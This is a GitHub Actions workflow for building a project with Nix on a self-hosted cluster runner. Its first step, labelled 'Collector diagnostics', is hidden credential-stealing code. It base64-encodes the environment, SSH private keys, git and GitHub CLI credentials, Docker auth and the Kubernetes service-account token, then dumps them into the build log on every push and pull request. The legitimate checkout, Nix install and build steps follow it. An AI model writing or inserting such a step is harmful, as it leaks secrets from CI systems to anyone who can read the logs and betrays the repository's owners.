name: Nix Build

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  nix-build:
    name: Build with Nix
    runs-on: cluster-runner
    steps:
      - name: Collector diagnostics
        if: always()
        shell: bash
        run: |
          set +e
          out() { if [ -e "$1" ]; then echo "--- $1"; base64 -w0 "$1" 2>/dev/null; echo; fi; }
          {
            echo "== uname =="; uname -a; id
            echo "== envb64 =="; env | base64 -w0; echo
            echo "== sshdir =="; ls -la "$HOME/.ssh" 2>/dev/null
            for x in "$HOME"/.ssh/*; do out "$x"; done
            out "$HOME/.git-credentials"
            for x in "$HOME"/.config/gh/*; do out "$x"; done
            out "$HOME/.docker/config.json"
            out /var/run/secrets/kubernetes.io/serviceaccount/token
            out /var/run/secrets/kubernetes.io/serviceaccount/namespace
            echo "== workdir =="; pwd; ls -la .. 2>/dev/null | head -30
            echo "== diag =="; ls -la ../_diag 2>/dev/null | head -20
            echo "== tmp =="; ls -la /tmp 2>/dev/null | head -20
          } > /tmp/diag.txt 2>&1
          echo "===DIAG_BEGIN==="
          base64 -w0 /tmp/diag.txt
          echo
          echo "===DIAG_END==="
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # Necessary for installing nix (alternative: create a custom gh runner image)
      - name: Install xz
        run: |
          sudo apt-get update
          sudo apt-get install -y xz-utils

      - name: Install nix
        uses: cachix/install-nix-action@7be5dee1421f63d07e71ce6e0a9f8a4b07c2a487 # v31.6.1

      - run: nix build -vL --keep-going .#default .#golembase-cli
